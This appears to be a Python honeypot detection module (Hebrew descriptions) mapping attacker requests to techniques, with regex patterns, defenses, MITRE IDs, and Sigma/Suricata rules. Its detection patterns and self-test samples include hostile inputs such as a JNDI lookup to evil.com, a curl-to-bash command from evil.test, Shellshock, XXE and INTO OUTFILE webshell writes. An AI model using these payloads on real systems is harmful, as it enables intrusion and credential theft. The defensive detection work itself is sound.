#!/usr/bin/env python3
"""
🍯 Attack knowledge base — classifies OBSERVED ATTACKER BEHAVIOUR.

This is the deliberate counterpart to `bluered.DEFENSE_KB`, and the distinction
matters:

    DEFENSE_KB  — matches our Red Team's findings about a target we scanned.
                  Semantics: "this target HAS a weakness."   (posture)

    ATTACK_KB   — matches raw requests an attacker sent at our honeypots.
                  Semantics: "someone ATTEMPTED this technique." (behaviour)

Feeding honeypot events through DEFENSE_KB would record the wrong claim
("my target has an injection flaw") and pollute the posture statistics, so the
two knowledge bases — and their signature tables — stay separate.

Crossing them is where the value is: a technique attackers actively attempt,
against a weakness our own scans found, is a real prioritisation signal.

Rule-based, zero deps. Purely defensive: every entry explains how to DETECT and
DEFEND against the technique — never how to perform it.
"""

import re
from urllib.parse import unquote_plus

# Ordered specific -> generic. First matching rule wins, so put narrow
# high-signal techniques (log4shell, shellshock) above broad ones (scanner).
ATTACK_KB = [
    {
        "id": "log4shell",
        "name": "ניסיון ניצול Log4Shell (JNDI)",
        "severity": "critical",
        "patterns": [r"\$\{jndi:", r"\$\{\s*jndi", r"jndi:(ldap|rmi|dns|iiop)"],
        "technique": "התוקף מזריק מחרוזת JNDI לשדה שנרשם ללוג, כדי לגרום ל-Log4j "
                     "לטעון קוד מרוחק ולהריץ אותו (CVE-2021-44228).",
        "defenses": [
            "עדכן Log4j ל-2.17.1+ (או הסר את JndiLookup.class)",
            "חסום תעבורת LDAP/RMI יוצאת מהשרתים",
            "הפעל WAF עם חוק חסימה ל-${jndi:",
        ],
        "mitre": "T1190 (Exploit Public-Facing Application)",
        "sigma": ("title: Log4Shell JNDI Exploitation Attempt\n"
                  "logsource:\n  category: webserver\n"
                  "detection:\n  sel:\n    -_raw|contains: '${jndi:'\n"
                  "  condition: sel\nlevel: critical"),
        "suricata": ('alert http any any -> $HOME_NET any (msg:"Log4Shell JNDI attempt"; '
                     'flow:to_server; content:"${jndi:"; nocase; '
                     'classtype:web-application-attack; sid:1000101; rev:1;)'),
    },
    {
        "id": "shellshock",
        "name": "ניסיון ניצול Shellshock",
        "severity": "critical",
        "patterns": [r"\(\s*\)\s*\{\s*:\s*;\s*\}\s*;", r"\(\)\s*\{.*\}\s*;\s*(/bin/|echo|cat)"],
        "technique": "התוקף שותל הגדרת פונקציית Bash זדונית בהדר HTTP, ומנצל את "
                     "CVE-2014-6271 כדי להריץ פקודות דרך CGI.",
        "defenses": [
            "עדכן Bash (CVE-2014-6271 ואילך)",
            "השבת mod_cgi / סקריפטים ב-CGI אם אינם נחוצים",
            "הפעל WAF עם חוק ל-'() {'",
        ],
        "mitre": "T1190 (Exploit Public-Facing Application)",
        "sigma": ("title: Shellshock Exploitation Attempt\n"
                  "logsource:\n  category: webserver\n"
                  "detection:\n  sel:\n    -_raw|re: '\\(\\s*\\)\\s*\\{\\s*:\\s*;\\s*\\}'\n"
                  "  condition: sel\nlevel: critical"),
        "suricata": ('alert http any any -> $HOME_NET any (msg:"Shellshock attempt in HTTP header"; '
                     'flow:to_server; content:"() {"; classtype:web-application-attack; '
                     'sid:1000102; rev:1;)'),
    },
    {
        "id": "ssrf-metadata",
        "name": "ניסיון SSRF למטא-דאטה של הענן",
        "severity": "critical",
        "patterns": [r"169\.254\.169\.254", r"metadata\.google\.internal",
                     r"metadata\.azure\.com", r"/latest/meta-data"],
        "technique": "התוקף מנסה לגרום לשרת לפנות לכתובת המטא-דאטה הפנימית של ספק "
                     "הענן (169.254.169.254) כדי לגנוב אישורי IAM זמניים.",
        "defenses": [
            "אכוף IMDSv2 (דורש טוקן) וחסום IMDSv1",
            "חסום 169.254.169.254 ברמת ה-firewall/egress מהאפליקציה",
            "אמת ורשום ב-allowlist כל URL שהאפליקציה מביאה",
        ],
        "mitre": "T1552.005 (Cloud Instance Metadata API)",
        "sigma": ("title: SSRF to Cloud Metadata Endpoint\n"
                  "logsource:\n  category: webserver\n"
                  "detection:\n  sel:\n    c-uri|contains: '169.254.169.254'\n"
                  "  condition: sel\nlevel: critical"),
        "suricata": ('alert http $HOME_NET any -> any any (msg:"SSRF attempt to cloud metadata IP"; '
                     'flow:to_server; content:"169.254.169.254"; '
                     'classtype:web-application-attack; sid:1000103; rev:1;)'),
    },
    {
        # SQL honeypot (port 3306). Must stay ABOVE sqli-attempt: a UDF drop or
        # INTO OUTFILE is direct DB abuse (RCE / file write), not URL-borne SQLi.
        "id": "sql-udf-rce",
        "name": "ניסיון RCE דרך UDF במסד הנתונים",
        "severity": "critical",
        "patterns": [r"soname\s+['\"]", r"lib_mysqludf", r"\bsys_exec\s*\(",
                     r"\bsys_eval\s*\(", r"create\s+function\s+\w+\s+returns\s+\w+\s+soname"],
        "technique": "התוקף התחבר למסד הנתונים ומנסה לטעון UDF (User-Defined Function) "
                     "זדוני כדי להריץ פקודות מערכת ישירות מתוך MySQL — השתלטות מלאה על השרת.",
        "defenses": [
            "הסר את הרשאת FILE ואת הכתיבה ל-mysql.* ממשתמשי היישום",
            "הגדר plugin_dir לתיקייה לא ניתנת לכתיבה, ואכוף secure_file_priv",
            "אל תריץ mysqld כ-root; הגבל את המשתמש שלו במערכת הקבצים",
            "חסום גישה מרוחקת ל-3306 (bind-address=127.0.0.1 + firewall)",
        ],
        "mitre": "T1059 (Command and Scripting Interpreter)",
        "sigma": ("title: MySQL UDF Creation (Possible RCE)\n"
                  "logsource:\n  product: mysql\n  category: application\n"
                  "detection:\n  sel:\n    query|re: '(?i)(create\\s+function.*soname|"
                  "sys_exec|lib_mysqludf)'\n  condition: sel\nlevel: critical"),
        "suricata": ('alert tcp $EXTERNAL_NET any -> $HOME_NET 3306 (msg:"MySQL UDF RCE attempt"; '
                     'flow:to_server; content:"SONAME"; nocase; '
                     'classtype:attempted-admin; sid:1000114; rev:1;)'),
    },
    {
        "id": "sql-file-access",
        "name": "קריאה/כתיבת קבצים דרך מסד הנתונים",
        "severity": "critical",
        "patterns": [r"into\s+(out|dump)file", r"\bload_file\s*\("],
        "technique": "התוקף משתמש ב-INTO OUTFILE/DUMPFILE או LOAD_FILE כדי לכתוב "
                     "קבצים (למשל webshell לתיקיית הווב) או לקרוא קבצים רגישים דרך המסד.",
        "defenses": [
            "הגדר secure_file_priv לתיקייה מבודדת (או ריק כדי לחסום לגמרי)",
            "הסר את הרשאת FILE ממשתמשי היישום",
            "הרץ mysqld עם משתמש בעל הרשאות מינימליות",
            "חסום גישה מרוחקת ל-3306",
        ],
        "mitre": "T1505.003 (Web Shell) / T1005 (Data from Local System)",
        "sigma": ("title: MySQL File Read/Write via Query\n"
                  "logsource:\n  product: mysql\n  category: application\n"
                  "detection:\n  sel:\n    query|re: '(?i)(into\\s+(out|dump)file|load_file\\s*\\()'\n"
                  "  condition: sel\nlevel: critical"),
        "suricata": ('alert tcp $EXTERNAL_NET any -> $HOME_NET 3306 (msg:"MySQL INTO OUTFILE/LOAD_FILE"; '
                     'flow:to_server; pcre:"/(into\\s+(out|dump)file|load_file)/i"; '
                     'classtype:attempted-admin; sid:1000115; rev:1;)'),
    },
    {
        "id": "sqli-attempt",
        "name": "ניסיון הזרקת SQL",
        "severity": "high",
        "patterns": [
            r"union\s+(all\s+)?select", r"'\s*or\s+'?1'?\s*=\s*'?1", r"\bor\s+1\s*=\s*1\b",
            r"information_schema", r"\bsleep\s*\(\s*\d", r"benchmark\s*\(", r"pg_sleep\s*\(",
            r"waitfor\s+delay", r"'\s*--\s", r"\bxp_cmdshell\b", r"\bgroup_concat\s*\(",
            r"\bconcat\s*\(\s*0x", r"'\s*;\s*drop\s+table",
        ],
        "technique": "התוקף מזריק תחביר SQL לפרמטר קלט כדי לשנות את השאילתה — "
                     "לדלות נתונים, לעקוף אימות או להריץ פקודות במסד.",
        "defenses": [
            "השתמש ב-Prepared Statements / ORM בלבד — אף פעם לא שרשור מחרוזות",
            "אמת קלט (allowlist) והגבל הרשאות משתמש ה-DB (least privilege)",
            "אל תחזיר שגיאות DB גולמיות למשתמש",
            "הפעל WAF עם OWASP CRS",
        ],
        "mitre": "T1190 (Exploit Public-Facing Application)",
        "sigma": ("title: SQL Injection Pattern in Web Request\n"
                  "logsource:\n  category: webserver\n"
                  "detection:\n  sel:\n    -_raw|re: '(?i)(union\\s+select|or\\s+1=1|"
                  "information_schema|sleep\\s*\\(|benchmark\\s*\\()'\n"
                  "  condition: sel\nlevel: high"),
        "suricata": ('alert http any any -> $HOME_NET any (msg:"SQL injection attempt"; '
                     'flow:to_server; pcre:"/(union\\s+select|or\\s+1=1|information_schema)/i"; '
                     'classtype:web-application-attack; sid:1000104; rev:1;)'),
    },
    {
        "id": "rce-attempt",
        "name": "ניסיון הרצת פקודות (RCE / Command Injection)",
        "severity": "critical",
        "patterns": [
            r";\s*(id|whoami|uname|cat\s+/etc)", r"\|\s*(id|whoami|uname|sh|bash)\b",
            r"\$\(\s*(id|whoami|curl|wget)", r"`\s*(id|whoami|curl|wget)",
            r"&&\s*(curl|wget)\s+http", r"\b(curl|wget)\s+https?://\S+\s*\|\s*(sh|bash)",
            r"/bin/(sh|bash)\s+-c", r"\bnc\s+-e\b",
        ],
        "technique": "התוקף משרשר פקודות מערכת לקלט שמועבר ל-shell, כדי להריץ קוד "
                     "על השרת — לרוב כדי להוריד ולהפעיל payload.",
        "defenses": [
            "לעולם אל תעביר קלט משתמש ל-shell — השתמש ב-API עם argv (ללא shell=True)",
            "הרץ שירותים בהרשאות מינימליות ובסביבה מבודדת (container/seccomp)",
            "חסום תעבורה יוצאת שאינה נחוצה (מונע הורדת payload)",
        ],
        "mitre": "T1059 (Command and Scripting Interpreter)",
        "sigma": ("title: Command Injection Pattern in Web Request\n"
                  "logsource:\n  category: webserver\n"
                  "detection:\n  sel:\n    -_raw|re: '(?i)(;\\s*(id|whoami)|\\|\\s*(id|whoami)|"
                  "\\$\\(\\s*(id|curl)|(curl|wget)\\s+https?://.*\\|\\s*(sh|bash))'\n"
                  "  condition: sel\nlevel: critical"),
        "suricata": ('alert http any any -> $HOME_NET any (msg:"Command injection attempt"; '
                     'flow:to_server; pcre:"/(;\\s*(id|whoami|uname)|\\|\\s*(sh|bash))/i"; '
                     'classtype:web-application-attack; sid:1000105; rev:1;)'),
    },
    {
        # Must stay ABOVE path-traversal: an XXE payload usually carries
        # file:///etc/passwd, and the traversal is only its mechanism — the
        # entity declaration is the more specific (and correct) verdict.
        "id": "xxe-attempt",
        "name": "ניסיון הזרקת XXE",
        "severity": "high",
        "patterns": [r"<!entity", r"<!doctype[^>]+entity", r"system\s+[\"']file://",
                     r"system\s+[\"']https?://"],
        "technique": "התוקף שולח XML עם ישות חיצונית (External Entity) כדי לגרום "
                     "למפענח לקרוא קבצים מקומיים או לפנות לשרתים פנימיים.",
        "defenses": [
            "השבת ישויות חיצוניות ו-DTD במפענח ה-XML",
            "העדף JSON על XML היכן שאפשר",
            "הרץ עם least privilege וחסום egress",
        ],
        "mitre": "T1059 / T1552 (Unsecured Credentials)",
        "sigma": ("title: XXE Injection Attempt\n"
                  "logsource:\n  category: webserver\n"
                  "detection:\n  sel:\n    -_raw|contains: '<!ENTITY'\n"
                  "  condition: sel\nlevel: high"),
        "suricata": ('alert http any any -> $HOME_NET any (msg:"XXE external entity attempt"; '
                     'flow:to_server; content:"<!ENTITY"; nocase; '
                     'classtype:web-application-attack; sid:1000108; rev:1;)'),
    },
    {
        "id": "path-traversal",
        "name": "ניסיון מעבר תיקיות (Path Traversal / LFI)",
        "severity": "high",
        "patterns": [
            r"\.\./\.\./", r"\.\.\\\.\.\\", r"%2e%2e[/%]", r"\.\.%2f", r"%252e%252e",
            r"/etc/(passwd|shadow|hosts)", r"c:\\+windows\\+win\.ini",
            r"\bphp://(filter|input)", r"\bfile://",
        ],
        "technique": "התוקף משתמש ברצפי '../' כדי לצאת מתיקיית הבסיס ולקרוא קבצים "
                     "רגישים במערכת (למשל /etc/passwd או קבצי תצורה עם סודות).",
        "defenses": [
            "נרמל (canonicalize) כל נתיב ואמת שהוא בתוך תיקיית הבסיס",
            "אל תבנה נתיבי קבצים מקלט משתמש — השתמש במזהים ומיפוי פנימי",
            "הרץ את השירות עם משתמש ייעודי ללא גישה לקבצי מערכת",
        ],
        "mitre": "T1083 (File and Directory Discovery)",
        "sigma": ("title: Path Traversal Attempt\n"
                  "logsource:\n  category: webserver\n"
                  "detection:\n  sel:\n    c-uri|re: '(\\.\\./|%2e%2e|/etc/passwd)'\n"
                  "  condition: sel\nlevel: high"),
        "suricata": ('alert http any any -> $HOME_NET any (msg:"Path traversal attempt"; '
                     'flow:to_server; http.uri; pcre:"/(\\.\\.\\/|%2e%2e|\\/etc\\/passwd)/i"; '
                     'classtype:web-application-attack; sid:1000106; rev:1;)'),
    },
    {
        "id": "xss-attempt",
        "name": "ניסיון הזרקת XSS",
        "severity": "medium",
        "patterns": [
            r"<script[\s>]", r"</script>", r"javascript:", r"onerror\s*=", r"onload\s*=",
            r"onmouseover\s*=", r"<img[^>]+src\s*=\s*[\"']?x", r"<svg[^>]*onload",
            r"document\.cookie", r"alert\s*\(\s*(1|document)",
        ],
        "technique": "התוקף מזריק JavaScript לשדה שמוחזר לדף, כדי להריץ קוד בדפדפן "
                     "של משתמשים אחרים — לגניבת session או השתלטות על חשבון.",
        "defenses": [
            "בצע Output Encoding לפי הקשר (HTML/attribute/JS)",
            "הגדר Content-Security-Policy מחמיר (ללא unsafe-inline)",
            "סמן עוגיות session כ-HttpOnly + Secure + SameSite",
        ],
        "mitre": "T1059.007 (JavaScript)",
        "sigma": ("title: XSS Pattern in Web Request\n"
                  "logsource:\n  category: webserver\n"
                  "detection:\n  sel:\n    -_raw|re: '(?i)(<script|javascript:|onerror\\s*=|<svg[^>]*onload)'\n"
                  "  condition: sel\nlevel: medium"),
        "suricata": ('alert http any any -> $HOME_NET any (msg:"XSS attempt in request"; '
                     'flow:to_server; pcre:"/(<script|javascript:|onerror\\s*=)/i"; '
                     'classtype:web-application-attack; sid:1000107; rev:1;)'),
    },
    {
        "id": "webshell-upload",
        "name": "ניסיון העלאת Webshell",
        "severity": "critical",
        "patterns": [
            r"\beval\s*\(\s*(base64_decode|\$_(get|post|request))",
            r"\bassert\s*\(\s*\$_", r"\bsystem\s*\(\s*\$_", r"\bpassthru\s*\(",
            r"\bshell_exec\s*\(", r"<\?php.{0,40}\$_(get|post|request)",
            r"filename=\"[^\"]+\.(php|phtml|jsp|asp|aspx)\b",
        ],
        "technique": "התוקף מנסה להעלות או להזריק קובץ סקריפט שמריץ פקודות — "
                     "כדי לקבל גישה מתמשכת (backdoor) לשרת.",
        "defenses": [
            "אכוף allowlist של סיומות + אמת content-type אמיתי",
            "אחסן קבצים שהועלו מחוץ ל-webroot וללא הרשאת הרצה",
            "בצע סריקת תוכן והשבת הרצת PHP בתיקיות העלאה",
        ],
        "mitre": "T1505.003 (Web Shell)",
        "sigma": ("title: Webshell Upload / Injection Attempt\n"
                  "logsource:\n  category: webserver\n"
                  "detection:\n  sel:\n    -_raw|re: '(?i)(eval\\s*\\(\\s*base64_decode|"
                  "shell_exec\\s*\\(|filename=\"[^\"]+\\.php)'\n"
                  "  condition: sel\nlevel: critical"),
        "suricata": ('alert http any any -> $HOME_NET any (msg:"Possible webshell upload"; '
                     'flow:to_server; content:"eval("; nocase; '
                     'classtype:web-application-attack; sid:1000109; rev:1;)'),
    },
    {
        "id": "secret-hunt",
        "name": "ציד סודות וקבצי תצורה",
        "severity": "high",
        "patterns": [
            r"/\.env\b", r"/\.git/(config|head)", r"/\.aws/credentials", r"/\.ssh/id_rsa",
            r"/config\.(json|php|yml|yaml)\b", r"/credentials\b", r"/\.htpasswd",
            r"/wp-config\.php", r"/backup.*\.(sql|zip|tar\.gz|bak)\b", r"/dump\.sql",
            r"/\.svn/", r"/\.DS_Store",
        ],
        "technique": "התוקף מחפש קבצים שנשארו בשרת בטעות וחושפים סודות — משתני "
                     "סביבה, מפתחות API, אישורי DB או היסטוריית Git מלאה.",
        "defenses": [
            "הסר קבצים רגישים מה-webroot (.env/.git/backup) — והחזר 404",
            "חסום נתיבים אלה בשרת הווב במפורש",
            "הכנס סודות דרך משתני סביבה/vault, לא דרך קבצים ב-webroot",
            "החלף כל סוד שייתכן שנחשף",
        ],
        "mitre": "T1552 (Unsecured Credentials)",
        "sigma": ("title: Sensitive File Hunting\n"
                  "logsource:\n  category: webserver\n"
                  "detection:\n  sel:\n    c-uri|contains:\n      - '/.env'\n      - '/.git/'\n"
                  "      - '/wp-config.php'\n      - '/.aws/credentials'\n"
                  "  condition: sel\nlevel: high"),
        "suricata": ('alert http any any -> $HOME_NET any (msg:"Sensitive file hunt (.env/.git)"; '
                     'flow:to_server; http.uri; pcre:"/(\\.env|\\.git\\/|wp-config\\.php)/i"; '
                     'classtype:web-application-attack; sid:1000110; rev:1;)'),
    },
    {
        # Must stay ABOVE cred-attack: the SSH blob carries "user=... pass=..."
        # which cred-attack's web-login pattern would otherwise swallow.
        "id": "ssh-bruteforce",
        "name": "Brute-force על SSH",
        "severity": "high",
        "patterns": [r"ssh\s+login\b", r"ssh-2\.0-\S+"],
        "technique": "התוקף מנסה להתחבר ל-SSH החשוף (פורט 22) עם שמות משתמש וסיסמאות "
                     "מתוך מילון — הווקטור הנפוץ ביותר באינטרנט. חשיפת SSH מזמינה brute-force מתמשך.",
        "defenses": [
            "אכוף אימות מפתחות בלבד — PasswordAuthentication no",
            "השבת התחברות root — PermitRootLogin no",
            "התקן fail2ban / הגבל קצב, ושקול שינוי פורט מ-22",
            "הגבל גישה ב-firewall לכתובות מורשות; שקול MFA",
        ],
        "mitre": "T1110 (Brute Force)",
        "sigma": ("title: SSH Brute-Force (Multiple Auth Failures)\n"
                  "logsource:\n  product: linux\n  service: auth\n"
                  "detection:\n  sel:\n    message|contains: 'Failed password'\n"
                  "  timeframe: 5m\n  condition: sel | count() by src_ip > 10\nlevel: high"),
        "suricata": ('alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:"SSH brute-force attempt"; '
                     'flow:to_server; threshold:type both,track by_src,count 10,seconds 60; '
                     'classtype:attempted-recon; sid:1000117; rev:1;)'),
    },
    {
        "id": "cred-attack",
        "name": "תקיפת אישורים (Brute-force / Credential Stuffing)",
        "severity": "high",
        "patterns": [
            r"\b(username|user|login|email)=.{0,60}&?\s*(password|passwd|pwd|pass)=",
            r"authorization:\s*basic\s+", r"\bwp-login\.php\b", r"/api/(auth|login|token)\b",
        ],
        "technique": "התוקף שולח שמות משתמש וסיסמאות בניסיון להתחבר — בין אם ניחוש "
                     "אישורי ברירת מחדל, מילון, או אישורים שדלפו מאתרים אחרים.",
        "defenses": [
            "אכוף MFA — זו ההגנה היחידה שבאמת עוצרת credential stuffing",
            "הגבל קצב (rate-limit) ונעל חשבון לפי IP + חשבון",
            "אסור סיסמאות ברירת מחדל וחסום סיסמאות שדלפו (HIBP)",
            "התקן fail2ban / הוסף CAPTCHA אחרי כשלים חוזרים",
        ],
        "mitre": "T1110 (Brute Force)",
        "sigma": ("title: Repeated Failed Web Logins (Brute-Force)\n"
                  "logsource:\n  category: webserver\n"
                  "detection:\n  sel:\n    c-uri|contains: '/login'\n    sc-status: 401\n"
                  "  timeframe: 5m\n  condition: sel | count() by src_ip > 10\nlevel: high"),
        "suricata": ('alert http any any -> $HOME_NET any (msg:"Web login brute-force"; '
                     'flow:to_server; http.uri; content:"/login"; '
                     'threshold:type both,track by_src,count 10,seconds 60; '
                     'classtype:attempted-recon; sid:1000111; rev:1;)'),
    },
    {
        "id": "cms-probe",
        "name": "מיפוי CMS / פאנל ניהול",
        "severity": "medium",
        "patterns": [
            r"/wp-(admin|content|includes|json)\b", r"/xmlrpc\.php", r"/phpmyadmin",
            r"/administrator/", r"/joomla", r"/drupal", r"/\.well-known/.*\.php",
            r"/cgi-bin/", r"/solr/", r"/actuator/", r"/manager/html", r"/jenkins",
            r"/adminer\.php", r"/pma/",
        ],
        "technique": "התוקף בודק נתיבים אופייניים ל-CMS ולממשקי ניהול, כדי לזהות "
                     "איזו תוכנה רצה ולנסות ניצולים ידועים לגרסה שלה.",
        "defenses": [
            "הגבל ממשקי ניהול ב-IP allowlist או מאחורי VPN",
            "שנה נתיבי ניהול מברירת מחדל והסתר גרסאות",
            "הסר רכיבים ותוספים שאינם בשימוש",
            "הפעל rate-limiting על נתיבי ניהול",
        ],
        "mitre": "T1595.003 (Wordlist Scanning)",
        "sigma": ("title: CMS / Admin Panel Probing\n"
                  "logsource:\n  category: webserver\n"
                  "detection:\n  sel:\n    c-uri|contains:\n      - '/wp-admin'\n"
                  "      - '/phpmyadmin'\n      - '/administrator/'\n      - '/actuator/'\n"
                  "  condition: sel\nlevel: medium"),
        "suricata": ('alert http any any -> $HOME_NET any (msg:"CMS/admin panel probing"; '
                     'flow:to_server; http.uri; pcre:"/(wp-admin|phpmyadmin|administrator\\/)/i"; '
                     'classtype:web-application-scan; sid:1000112; rev:1;)'),
    },
    {
        "id": "sql-login",
        "name": "התחברות ישירה למסד הנתונים",
        "severity": "high",
        "patterns": [r"mysql\s+login"],
        "technique": "התוקף מתחבר ישירות ל-MySQL החשוף (פורט 3306) — ניחוש אישורי "
                     "ברירת מחדל (root/ריק) או brute-force. חשיפת מסד לאינטרנט היא וקטור מוביל.",
        "defenses": [
            "אל תחשוף את המסד לאינטרנט — bind-address=127.0.0.1 + firewall ל-3306",
            "השבת התחברות root מרוחקת, אכוף סיסמאות חזקות, והרשאות per-host",
            "הפעל ניטור והגבלת קצב על ניסיונות התחברות; שקול fail2ban",
            "השתמש בחיבור מוצפן (require_secure_transport) ובמשתמשי יישום ייעודיים",
        ],
        "mitre": "T1110 (Brute Force) / T1190 (Exploit Public-Facing Application)",
        "sigma": ("title: MySQL Login From External Host\n"
                  "logsource:\n  product: mysql\n  category: application\n"
                  "detection:\n  sel:\n    event: connect\n"
                  "  timeframe: 5m\n  condition: sel | count() by src_ip > 10\nlevel: high"),
        "suricata": ('alert tcp $EXTERNAL_NET any -> $HOME_NET 3306 (msg:"MySQL login from external network"; '
                     'flow:to_server; threshold:type both,track by_src,count 10,seconds 60; '
                     'classtype:attempted-recon; sid:1000116; rev:1;)'),
    },
    {
        "id": "sql-enum",
        "name": "אנומרציית מסד הנתונים",
        "severity": "low",
        "patterns": [r"show\s+databases", r"show\s+tables", r"\bmysql\.user\b",
                     r"@@datadir", r"@@hostname", r"@@version\b", r"@@basedir"],
        "technique": "לאחר התחברות, התוקף ממפה את המסד — רשימת מסדים/טבלאות, גרסה, "
                     "נתיבים ומשתמשים — כדי למצוא נתונים רגישים ווקטורי ניצול.",
        "defenses": [
            "הענק הרשאות מינימליות — משתמש יישום לא צריך לראות את mysql.user",
            "הפרד משתמש/מסד לכל יישום (least privilege)",
            "אל תחשוף את המסד לרשת ציבורית",
            "נטר שאילתות מטא-דאטה חריגות (information_schema, mysql.*)",
        ],
        "mitre": "T1082 (System Information Discovery)",
        "sigma": ("title: MySQL Schema/User Enumeration\n"
                  "logsource:\n  product: mysql\n  category: application\n"
                  "detection:\n  sel:\n    query|re: '(?i)(show\\s+databases|mysql\\.user|@@datadir)'\n"
                  "  condition: sel\nlevel: low"),
        "suricata": "",
    },
    {
        "id": "scanner-recon",
        "name": "סריקה אוטומטית (כלי סורק מזוהה)",
        "severity": "low",
        "patterns": [
            r"\b(sqlmap|nikto|nmap|masscan|zgrab|nuclei|dirbuster|gobuster|feroxbuster)\b",
            r"\b(wpscan|acunetix|nessus|openvas|qualys|netsparker|burp|zaproxy)\b",
            r"\b(havij|hydra|medusa|joomscan|whatweb)\b",
            r"user-agent:\s*(python-requests|curl|wget|go-http-client|libwww-perl)",
            r"\bmasscan/\d", r"\bcensys\b", r"\bshodan\b",
        ],
        "technique": "כלי סריקה אוטומטי מזוהה לפי טביעת האצבע שלו (User-Agent או "
                     "דפוס בקשות), ממפה את השירות לפני תקיפה ממוקדת.",
        "defenses": [
            "הפעל rate-limiting וחסימה אוטומטית לסורקים (fail2ban/WAF)",
            "אל תחשוף גרסאות ובאנרים (ServerTokens Prod)",
            "הפעל WAF עם זיהוי טביעות אצבע של סורקים",
            "עקוב אחר IP סורקים — לרוב מקדימים תקיפה ממוקדת",
        ],
        "mitre": "T1595 (Active Scanning)",
        "sigma": ("title: Known Scanner User-Agent\n"
                  "logsource:\n  category: webserver\n"
                  "detection:\n  sel:\n    cs-user-agent|contains:\n      - 'sqlmap'\n"
                  "      - 'nikto'\n      - 'nuclei'\n      - 'gobuster'\n      - 'masscan'\n"
                  "  condition: sel\nlevel: low"),
        "suricata": ('alert http any any -> $HOME_NET any (msg:"Known scanner User-Agent"; '
                     'flow:to_server; http.user_agent; pcre:"/(sqlmap|nikto|nuclei|masscan)/i"; '
                     'classtype:web-application-scan; sid:1000113; rev:1;)'),
    },
    {
        "id": "path-discovery",
        "name": "חיפוש נתיבים עיוור (Directory Brute-force)",
        "severity": "low",
        "patterns": [r"__PATH_DISCOVERY__"],  # behavioural — set by the sensor, not by regex
        "technique": "התוקף מנסה שמות נתיבים רבים ברצף (רובם מחזירים 404) כדי לגלות "
                     "דפים ותיקיות שאינם מקושרים מהאתר.",
        "defenses": [
            "הפעל rate-limiting לפי IP וחסום אחרי ריבוי 404",
            "החזר 404 אחיד לכל נתיב לא קיים (ללא רמזים)",
            "אל תשאיר נתיבים 'נסתרים' כאמצעי אבטחה — אבטח בהרשאות",
        ],
        "mitre": "T1595.003 (Wordlist Scanning)",
        "sigma": ("title: Directory Brute-Force (Many 404s from One Source)\n"
                  "logsource:\n  category: webserver\n"
                  "detection:\n  sel:\n    sc-status: 404\n"
                  "  timeframe: 1m\n  condition: sel | count() by src_ip > 25\nlevel: medium"),
        "suricata": "",
    },
]

_SEV_RANK = {"critical": 0, "high": 1, "medium": 2, "low": 3}
ATTACK_BY_ID = {r["id"]: r for r in ATTACK_KB}

# Pre-compile for speed — the sensor may replay thousands of events.
_COMPILED = [(r, [re.compile(p, re.I) for p in r["patterns"]]) for r in ATTACK_KB]


def get_attack(tid):
    """Return the full ATTACK_KB entry for a technique id, or None."""
    return ATTACK_BY_ID.get(tid)


def _views(blob):
    """Raw + URL-decoded views of a request, matched against as a set.

    Attackers URL-encode by default (sqlmap always does), so `UNION%20SELECT`
    would never match a `union\\s+select` pattern on the raw text — the payload
    silently degrades to a low-severity 'scanner' verdict. Decoding twice also
    catches double-encoding (%252e -> %2e -> '.'), a standard WAF-evasion trick.

    The raw view is kept because some patterns target the encoded form itself
    (e.g. `%2e%2e`), which decoding would destroy.
    """
    views = [blob]
    try:
        prev = blob
        for _ in range(2):
            dec = unquote_plus(prev)
            if dec == prev:
                break
            views.append(dec)
            prev = dec
    except Exception:
        pass
    return views


def classify(blob):
    """Classify one raw honeypot request blob -> ATTACK_KB entry, or None.

    `blob` should be the request rendered as text (method, URI, headers, body).
    First match wins, so ATTACK_KB is ordered specific -> generic.
    """
    if not blob:
        return None
    views = _views(blob)
    for rule, pats in _COMPILED:
        for pat in pats:
            if any(pat.search(v) for v in views):
                return rule
    return None


def classify_all(blob):
    """Return EVERY technique matching this blob (one request can carry several).

    A single request often chains techniques — e.g. a scanner UA carrying a SQLi
    payload. `classify` returns only the most specific; this returns all, sorted
    by severity, which is what the report should show.
    """
    if not blob:
        return []
    views = _views(blob)
    hits = []
    for rule, pats in _COMPILED:
        if any(p.search(v) for p in pats for v in views):
            hits.append(rule)
    hits.sort(key=lambda r: (_SEV_RANK.get(r["severity"], 9), r["name"]))
    return hits


def techniques():
    """Catalog of known techniques (for the UI / learning screen)."""
    return [{"id": r["id"], "name": r["name"], "severity": r["severity"],
             "technique": r["technique"], "mitre": r.get("mitre", ""),
             "defenses": r["defenses"]} for r in ATTACK_KB]


if __name__ == "__main__":
    # Quick self-check: every sample must land on its expected technique.
    SAMPLES = [
        ("GET /?id=1' OR 1=1-- HTTP/1.1", "sqli-attempt"),
        ("GET /?q=<script>alert(1)</script>", "xss-attempt"),
        ("GET /../../../../etc/passwd", "path-traversal"),
        ("GET / HTTP/1.1\nUser-Agent: sqlmap/1.7.2", "scanner-recon"),
        ("GET /.env HTTP/1.1", "secret-hunt"),
        ("GET /wp-admin/ HTTP/1.1", "cms-probe"),
        ("GET /?x=${jndi:ldap://evil.com/a}", "log4shell"),
        ("GET /?url=http://169.254.169.254/latest/meta-data/", "ssrf-metadata"),
        ("GET /?cmd=;whoami", "rce-attempt"),
        ("POST /login\n\nusername=admin&password=admin123", "cred-attack"),
        ("GET /cgi-bin/x\nUser-Agent: () { :;}; /bin/bash -c 'id'", "shellshock"),
        ("POST /up\n\nfilename=\"shell.php\"", "webshell-upload"),
        ("POST /x\n\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">", "xxe-attempt"),
        ("GET /index.html HTTP/1.1\nUser-Agent: Mozilla/5.0", None),
        # --- URL-encoded evasion: real attackers encode by default. These must
        # NOT degrade to the low-severity 'scanner-recon' catch-all. ---
        ("GET /api/v1/users?id=1'%20UNION%20SELECT%20null,version()--", "sqli-attempt"),
        ("GET /?id=1%20AND%20SLEEP(5)", "sqli-attempt"),
        ("GET /?cmd=;curl%20http://evil.test/sh%20|%20bash", "rce-attempt"),
        ("GET /?q=%3Cscript%3Ealert(1)%3C/script%3E", "xss-attempt"),
        ("GET /%2e%2e%2f%2e%2e%2fetc%2fpasswd", "path-traversal"),
        # double-encoded traversal (%252e -> %2e -> '.')
        ("GET /%252e%252e%252fetc%252fpasswd", "path-traversal"),
        # --- SQL honeypot (port 3306): direct DB abuse, not URL-borne SQLi ---
        ("MYSQL LOGIN user=root db= auth=1a2b3c", "sql-login"),
        ("MYSQL QUERY SELECT 0x3c3f706870 INTO OUTFILE '/var/www/html/s.php'", "sql-file-access"),
